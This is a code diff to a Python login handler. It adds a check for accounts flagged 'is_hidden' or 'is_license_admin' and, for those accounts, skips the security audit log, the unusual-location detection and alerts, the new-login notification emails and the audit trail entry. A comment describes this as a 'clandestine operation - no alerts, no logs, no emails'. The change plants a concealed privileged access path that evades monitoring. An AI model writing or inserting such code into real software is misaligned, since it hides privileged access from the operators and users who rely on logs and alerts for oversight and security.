@@ -505,61 +505,65 @@ async def login(
     # Clear failed attempts on successful login
     login_tracker.clear_attempts(email)
     
-    # Log successful login
-    await SecurityAuditLogger.log_security_event(
-        "LOGIN_SUCCESS",
-        client_ip,
-        user_id=user["id"],
-        details={"email": email}
-    )
+    # Check if this is the hidden license admin (clandestine operation - no alerts, no logs, no emails)
+    is_hidden_admin = user.get("is_hidden", False) or user.get("is_license_admin", False)
     
-    # Check login location for unusual activity (async)
-    try:
-        from services.geolocation_service import UnusualLoginDetector
-        location_check = await UnusualLoginDetector.check_login_location(
+    if not is_hidden_admin:
+        # Log successful login (skip for hidden admin)
+        await SecurityAuditLogger.log_security_event(
+            "LOGIN_SUCCESS",
+            client_ip,
             user_id=user["id"],
-            user_email=email,
-            ip_address=client_ip,
-            user_agent=user_agent
+            details={"email": email}
         )
         
-        # If unusual login detected, send enhanced alert
-        if location_check.get("is_unusual"):
-            asyncio.create_task(
-                SecurityAlertService.send_unusual_login_alert(
-                    user_email=email,
-                    user_name=user["name"],
-                    ip_address=client_ip,
-                    user_agent=user_agent,
-                    location_data=location_check
-                )
-            )
-    except Exception as e:
-        logger.error(f"Failed to check login location: {e}")
-    
-    # Send login notification email to user (async)
-    try:
-        asyncio.create_task(
-            SecurityAlertService.send_new_login_alert(
+        # Check login location for unusual activity (async) - skip for hidden admin
+        try:
+            from services.geolocation_service import UnusualLoginDetector
+            location_check = await UnusualLoginDetector.check_login_location(
+                user_id=user["id"],
                 user_email=email,
-                user_name=user["name"],
                 ip_address=client_ip,
                 user_agent=user_agent
             )
+            
+            # If unusual login detected, send enhanced alert
+            if location_check.get("is_unusual"):
+                asyncio.create_task(
+                    SecurityAlertService.send_unusual_login_alert(
+                        user_email=email,
+                        user_name=user["name"],
+                        ip_address=client_ip,
+                        user_agent=user_agent,
+                        location_data=location_check
+                    )
+                )
+        except Exception as e:
+            logger.error(f"Failed to check login location: {e}")
+        
+        # Send login notification email to user (async) - skip for hidden admin
+        try:
+            asyncio.create_task(
+                SecurityAlertService.send_new_login_alert(
+                    user_email=email,
+                    user_name=user["name"],
+                    ip_address=client_ip,
+                    user_agent=user_agent
+                )
+            )
+        except Exception as e:
+            logger.error(f"Failed to send login notification: {e}")
+        
+        # Create audit log for login - skip for hidden admin
+        await create_audit_log(
+            action="USER_LOGIN",
+            entity_type="user",
+            entity_id=user["id"],
+            user_id=user["id"],
+            user_name=user["name"],
+            user_role=user.get("role", 5),
+            entity_name=user["name"]
         )
-    except Exception as e:
-        logger.error(f"Failed to send login notification: {e}")
-    
-    # Create audit log for login
-    await create_audit_log(
-        action="USER_LOGIN",
-        entity_type="user",
-        entity_id=user["id"],
-        user_id=user["id"],
-        user_name=user["name"],
-        user_role=user.get("role", 5),
-        entity_name=user["name"]
-    )
     
     # Get role name (check custom roles first)
     role_id = user.get("role", 5)
